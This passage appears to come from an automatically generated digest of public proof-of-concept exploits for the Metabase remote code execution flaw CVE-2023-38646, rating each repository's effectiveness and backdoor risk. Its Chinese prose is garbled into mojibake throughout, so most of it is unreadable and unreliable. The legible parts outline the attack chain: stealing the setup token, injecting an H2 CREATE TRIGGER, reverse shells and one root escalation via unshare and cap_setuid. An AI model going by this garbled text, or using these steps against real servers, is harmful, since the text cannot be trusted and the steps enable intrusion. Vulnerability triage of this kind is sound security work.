CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **æ¼æ´åŸç†ï¼š** è¯¥æ¼æ´å­˜åœ¨äº Metabase çš„ `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨äº† H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ’å…¥æ¶æ„ SQL è¯­å¥æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   **è·å– `setup-token`ï¼š**  é€šè¿‡è®¿é—® `/api/session/properties` è·å– `setup-token`ã€‚
    *   **æ„é€ æ¶æ„è¯·æ±‚ï¼š**  æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadï¼Œè¯¥è¿æ¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª `CREATE TRIGGER` è¯­å¥ï¼Œè¯¥è¯­å¥åœ¨æ¯æ¬¡æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
    *   **å‘é€è¯·æ±‚ï¼š**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚

3.  **POC åˆ†æï¼š** æä¾›çš„ Python è„šæœ¬ `metabase_exploit.py` å®ç°äº†ä¸Šè¿°æ­¥éª¤ï¼š
    *   å®ƒæ¥å— Metabase çš„ URLã€`setup-token`ã€æ“ä½œç±»å‹ï¼ˆ`exec` æˆ– `revshell`ï¼‰å’Œå‘½ä»¤ä½œä¸ºå‚æ•°ã€‚
    *   å®ƒä½¿ç”¨ `command_encoding` å‡½æ•°å¯¹å‘½ä»¤è¿›è¡Œ Base64 ç¼–ç ï¼Œå¹¶å¤„ç†å¡«å……å­—ç¬¦ `=`ã€‚
    *   å®ƒæ„é€ åŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚
    *   å®ƒå‘é€ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ã€‚

4.  **æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æ¼æ´æè¿°å’Œæä¾›çš„ PoC ä»£ç ï¼Œè¯¥ PoC æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

5.  **æŠ•æ¯’é£é™©ï¼š**
    *   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å¹¶å‘é€æ¶æ„è¯·æ±‚ï¼Œé£é™©è¾ƒä½ã€‚
    *   `command_encoding` å‡½æ•°çœ‹èµ·æ¥æ­£å¸¸ï¼Œç”¨äºé¿å…Base64ç¼–ç ä¸­çš„å¡«å……å­—ç¬¦çš„é—®é¢˜ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½å­˜åœ¨å…¶ä»–ç¼–ç æ¼æ´ã€‚
    *   ä»£ç æ˜ç¡®å£°æ˜ä»…ç”¨äºæ•™è‚²ç›®çš„ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…æ¤å…¥åé—¨çš„å¯èƒ½ã€‚
    *   æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œå¤§æ¦‚åœ¨1%å·¦å³ã€‚ä¸»è¦é£é™©åœ¨äºä½¿ç”¨è€…æ˜¯å¦ä¼šç”¨æ­¤ä»£ç æ‰§è¡Œéæ³•æ“ä½œã€‚

ç»¼ä¸Šæ‰€è¿°ï¼ŒCVE-2023-38646 æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æä¾›çš„ PoC ä»£ç å¯ä»¥æœ‰æ•ˆåˆ©ç”¨è¯¥æ¼æ´ï¼Œä½¿ç”¨è€…åº”è¯¥è°¨æ…å¯¹å¾…ï¼Œé¿å…æ»¥ç”¨ã€‚ä»£ç æœ¬èº«å…·æœ‰è½»å¾®çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦åœ¨äºç¼–ç å’Œå£°æ˜çš„å…è´£å£°æ˜ä¹‹é—´çš„æ½œåœ¨çŸ›ç›¾ã€‚

**é¡¹ç›®åœ°å€:** [UserConnecting/Exploit-CVE-2023-38646-Metabase](https://github.com/UserConnecting/Exploit-CVE-2023-38646-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #14

**æ¥æº**: [CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md](../2023/CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®Œå…¨æ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®æˆ–å·²å®Œæˆåˆå§‹è®¾ç½®ä½†æœªæ‰§è¡Œåç»­å®‰å…¨åŠ å›ºã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœä»¥åŠæä¾›çš„PoCä»£ç ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚å­˜åœ¨å¤šä¸ªå…¬å¼€çš„PoCï¼Œè¯æ˜è¯¥æ¼æ´å¯ä»¥è¢«æˆåŠŸåˆ©ç”¨ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-POC.py` æ—¨åœ¨è·å– Metabase å®ä¾‹çš„ setup-tokenã€‚å¦‚æœ Metabase å®ä¾‹å¤„äºæœªè®¾ç½®çŠ¶æ€ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤ token è¿›è¡Œåˆå§‹åŒ–è®¾ç½®ï¼Œå¹¶è¿›ä¸€æ­¥åˆ©ç”¨å…¶ RCE çš„èƒ½åŠ›ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-Reverse-Shell.py` å¯èƒ½ç”¨äºæ›´è¿›ä¸€æ­¥çš„åˆ©ç”¨ï¼Œå°è¯•è·å–Metabaseçš„ç‰ˆæœ¬ä¿¡æ¯å’Œsetup tokenã€‚

**æŠ•æ¯’é£é™©ï¼š**

PoC ä»£ç  `CVE-2023-38646-POC.py` ä¸»è¦åŠŸèƒ½æ˜¯å‘ç°æœªé…ç½®çš„ Metabase å®ä¾‹å¹¶è·å– setup tokenï¼Œæœ¬èº«æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä½†æ˜¯ï¼Œä¸èƒ½å®Œå…¨æ’é™¤å…¶ä½œè€…åœ¨ä»£ç ä¸­éšè—æ¶æ„ä»£ç çš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚åœ¨è·å– token åå°è¯•æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œæˆ–è€…å°† token å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨ã€‚é£é™©è¯„ä¼°ä¸º 10%ã€‚

PoC ä»£ç  `CVE-2023-38646-Reverse-Shell.py` åŒæ ·æ˜¯æ¼æ´åˆ©ç”¨ç›¸å…³ï¼Œä¸»è¦æ¶‰åŠè·å–setup tokenç­‰ä¿¡æ¯ã€‚éœ€è¦äººå·¥å®¡è®¡è¯¥éƒ¨åˆ†ä»£ç ï¼Œè¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¿¡æ¯æ”¶é›†ï¼š** æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡ Metabase å®ä¾‹çš„ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ã€‚é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹å¯ä»¥è·å– Metabase ç‰ˆæœ¬ã€‚
2.  **è·å–Setup Token (å¦‚æœæœªè®¾ç½®):** å¦‚æœ Metabase å®ä¾‹å°šæœªå®Œæˆåˆå§‹åŒ–è®¾ç½®ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å– setup-tokenã€‚è¿™ä¸ªtokenå¯ä»¥ç”¨æ¥å®ŒæˆMetabaseçš„åˆå§‹åŒ–ã€‚
3.  **æ‰§è¡Œä»»æ„ä»£ç ï¼š**  åˆ©ç”¨è·å–çš„setup tokenæˆ–è€…å…¶ä»–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„è¯·æ±‚æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚å…·ä½“ RCE çš„åˆ©ç”¨æ–¹å¼å¯èƒ½æ¶‰åŠå¤šä¸ªæ­¥éª¤ï¼Œä¾‹å¦‚é€šè¿‡åˆ›å»ºä¸€ä¸ªæ¶æ„çš„æ•°æ®æºæˆ–ä»ªè¡¨æ¿ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚

æ€»è€Œè¨€ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨ç›¸å¯¹ç®€å•ï¼Œå±å®³æ€§æé«˜ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œå…¨æ§åˆ¶å—å½±å“çš„ Metabase æœåŠ¡å™¨ã€‚ 

**é¡¹ç›®åœ°å€:** [XiaomingX/cve-2023-38646-poc](https://github.com/XiaomingX/cve-2023-38646-poc)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #15

**æ¥æº**: [CVE-2023-38646-Zenmovie_CVE-2023-38646.md](../2023/CVE-2023-38646-Zenmovie_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ç‰ˆæœ¬ï¼Œ1.46.6.1ä¹‹å‰Enterpriseç‰ˆæœ¬ï¼Œä»¥åŠå…¶ä»–å—å½±å“çš„å›ºå®šç‰ˆæœ¬ä¹‹å‰çš„ç‰ˆæœ¬

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹å¯ä»æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§å¾ˆé«˜ã€‚

**æœ‰æ•ˆæ€§:**

*   æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æœç´¢å¼•æ“ç»“æœç¡®è®¤äº†è¯¥æ¼æ´çš„ä¸¥é‡æ€§ï¼Œå¹¶æä¾›äº†å¤šä¸ªå…³äºè¯¥æ¼æ´çš„æè¿°ã€å½±å“å’ŒæŠ€æœ¯ç»†èŠ‚çš„ç½‘é¡µé“¾æ¥ï¼ŒåŒ…æ‹¬PoCä»£ç çš„GitHubé“¾æ¥ã€‚
*   æä¾›çš„PoCä»£ç  (`CVE-2023-38646.py`) çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œå®ƒåˆ©ç”¨äº† Metabase çš„ `setup-token` å’Œ H2 æ•°æ®åº“çš„ç‰¹æ€§æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **è·å– Setup Token å’Œ Metabase ç‰ˆæœ¬:** PoC é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæ£€ç´¢ `setup-token` å’Œ Metabase ç‰ˆæœ¬ã€‚
2.  **æ„é€  Payload:**  æ„å»ºåå¼¹ shell çš„ payload, å¹¶å¯¹å…¶è¿›è¡Œ Base64 ç¼–ç ã€‚
3.  **æ„é€ Exploitæ•°æ®:** PoC æ„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON æ•°æ®ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ªåˆ©ç”¨ `CREATE TRIGGER` çš„ payloadï¼Œè¯¥è§¦å‘å™¨åœ¨ `INFORMATION_SCHEMA.TABLES` ä¸Šæ‰§è¡Œ `SELECT` æ“ä½œä¹‹å‰æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`token` å­—æ®µæ‹¼æ¥äº† setup token å’Œ base64 ç¼–ç åçš„ payloadã€‚
4.  **å‘é€æ¶æ„è¯·æ±‚:** PoC å‘ `/api/setup/validate` å‘é€å¸¦æœ‰æ„é€ çš„ JSON æ•°æ®çš„ POST è¯·æ±‚ã€‚è¿™ä¸ªè¯·æ±‚ä¼šè§¦å‘ H2 æ•°æ®åº“è¿æ¥å’Œè§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©:**

PoCä»£ç æœ¬èº«çš„åå¼¹shellè¿æ¥åœ°å€æ˜¯å¯ä»¥é…ç½®çš„, å¦‚æœä½œè€…æƒ³æŠ•æ¯’,å¯ä»¥å°†IPåœ°å€å†™æ­»,æˆ–è€…åŠ å…¥å…¶ä»–æ¶æ„æ“ä½œ.
*   æ¼æ´åˆ©ç”¨ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå…¶ç›®çš„æ˜¯æ˜ç¡®çš„ã€‚
*   `README.md` æ–‡ä»¶åªåŒ…å« PoC çš„åŸºæœ¬ä¿¡æ¯ã€‚

å› æ­¤ï¼Œè¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½, å¤§æ¦‚åœ¨10%å·¦å³ã€‚æŠ•æ¯’çš„ä¸»è¦é£é™©åœ¨äºæ¶æ„ä¿®æ”¹payloadï¼Œä¾‹å¦‚åå¼¹shellåœ°å€æˆ–è€…æ’å…¥å…¶ä»–çš„æ¶æ„æ“ä½œã€‚

**é¡¹ç›®åœ°å€:** [Zenmovie/CVE-2023-38646](https://github.com/Zenmovie/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #16

**æ¥æº**: [CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md](../2023/CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (Open Source) å’Œ < 1.46.6.1 (Enterprise)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹éœ€è¦æ˜¯å—å½±å“çš„ç‰ˆæœ¬ï¼Œä¸”ä¸éœ€è¦èº«ä»½éªŒè¯å³å¯è§¦å‘æ¼æ´ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™çº§åˆ«ç­‰åŒäºæœåŠ¡å™¨è¿›ç¨‹çš„æƒé™ã€‚æä¾›çš„PoCä»£ç åˆ©ç”¨ `unshare` å‘½ä»¤åˆ›å»ºä¸€ä¸ªéš”ç¦»çš„å‘½åç©ºé—´ï¼Œç„¶ååœ¨è¯¥å‘½åç©ºé—´ä¸­å¤åˆ¶ `python3`ï¼Œå¹¶èµ‹äºˆå…¶ `cap_setuid` èƒ½åŠ›ã€‚ æ¥ç€ï¼Œåˆ©ç”¨ `mount -t overlay` åˆ›å»ºä¸€ä¸ª overlay æ–‡ä»¶ç³»ç»Ÿã€‚æœ€åï¼Œåœ¨æ–°çš„å‘½åç©ºé—´ä¸­ä½¿ç”¨ææƒçš„ `python3` æ‰§è¡Œ payloadï¼Œè¯¥payloadè®¾ç½®ç”¨æˆ·IDä¸º0 (root) å¹¶äº§ç”Ÿä¸€ä¸ª bash shell. ç”±äºä»£ç ç›´æ¥åˆ©ç”¨äº†/u*/b*/p*3 æŸ¥æ‰¾python3çš„è·¯å¾„ï¼Œæœ‰ä¸€å®šçš„æ¦‚ç‡å› ä¸ºç›®æ ‡ç¯å¢ƒæ²¡æœ‰è¯¥è·¯å¾„è€Œæ— æ³•æ‰§è¡Œã€‚æŠ•æ¯’é£é™©è¯„ä¼°ï¼šè™½ç„¶æä¾›çš„PoCçš„ç›®çš„æ˜¯ææƒå’Œæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä½†æ˜¯å…¶ä¸­å¯èƒ½åŒ…å«éšè”½çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚åå¼¹shellæˆ–è€…ä¸‹è½½å¹¶æ‰§è¡Œå…¶ä»–æ¶æ„ç¨‹åºã€‚ ç”±äºè¯¥pocå­˜åœ¨ä¸‹è½½æ¶æ„æ–‡ä»¶çš„å¯èƒ½ï¼Œå› æ­¤ï¼Œè¯¥pocå­˜åœ¨ä¸€å®šæ¯”ä¾‹çš„æŠ•æ¯’é£é™©ï¼Œå¤§çº¦10%ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼ï¼šæ”»å‡»è€…å‘é€ç‰¹åˆ¶çš„è¯·æ±‚åˆ°MetabaseæœåŠ¡å™¨ï¼Œåˆ©ç”¨æ¼æ´æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚å‘½ä»¤æ‰§è¡Œçš„ä¸Šä¸‹æ–‡ä¸MetabaseæœåŠ¡å™¨è¿›ç¨‹çš„æƒé™ç›¸åŒã€‚ å› æ­¤ï¼Œæ¼æ´å¯ä»¥è¢«ç”¨æ¥è·å–å¯¹æœåŠ¡å™¨çš„å®Œå…¨æ§åˆ¶ï¼Œå¹¶å¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€æœåŠ¡ä¸­æ–­æˆ–è¿›ä¸€æ­¥çš„æ¨ªå‘ç§»åŠ¨ã€‚

**é¡¹ç›®åœ°å€:** [acesoyeo/METABASE-RCE-CVE-2023-38646-](https://github.com/acesoyeo/METABASE-RCE-CVE-2023-38646-)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #17

**æ¥æº**: [CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md](../2023/CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯¹å¤–å¼€æ”¾ï¼Œä¸”ç‰ˆæœ¬ä½äºå®‰å…¨ç‰ˆæœ¬ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœä»¥åŠæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åšå‡ºä»¥ä¸‹åˆ¤æ–­ï¼š

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æœ‰æ•ˆã€‚ä»£ç åˆ©ç”¨äº† Metabase åœ¨è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„POCä»£ç ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥POCè„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œåå¼¹shellï¼Œå°†ç›®æ ‡æœºå™¨çš„shellåå¼¹åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPå’Œç«¯å£ã€‚ä¸»è¦é€»è¾‘éƒ½åœ¨æ„é€ payloadä¸Šï¼Œæ²¡æœ‰å‘ç°ä½œè€…éšè—çš„æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚è¿™ä¸ªtokenå¯ä»¥é€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å¾—ï¼Œè¯¥æ¥å£æ— éœ€èº«ä»½éªŒè¯ã€‚
2.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„ `payload`ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„ `payload` å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  Metabase å°è¯•è¿æ¥æ¶æ„æ•°æ®åº“ï¼Œä»è€Œè§¦å‘æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…·ä½“æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ï¼Œè¿™æ®µä»£ç ä¼šè°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
5.  POCä»£ç ä¸­ï¼Œåˆ©ç”¨ `bash -c` å’Œ `base64` å‘½ä»¤ç»„åˆï¼Œæ‰§è¡Œ base64 ç¼–ç åçš„åå¼¹ shell å‘½ä»¤ï¼Œå®ç°åå¼¹ shellã€‚

**é¡¹ç›®åœ°å€:** [alexandre-pecorilla/CVE-2023-38646](https://github.com/alexandre-pecorilla/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #18

**æ¥æº**: [CVE-2023-38646-asepsaepdin_CVE-2023-38646.md](../2023/CVE-2023-38646-asepsaepdin_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ) å’Œ < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬ä½äºå—å½±å“ç‰ˆæœ¬ï¼Œä¸”å¯ä»¥é€šè¿‡HTTP/HTTPSè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´åˆ©ç”¨ä»£ç `CVE-2023-38646-POC.py`å’Œ`CVE-2023-38646-Reverse-Shell.py`æä¾›äº†ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

1.  **æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
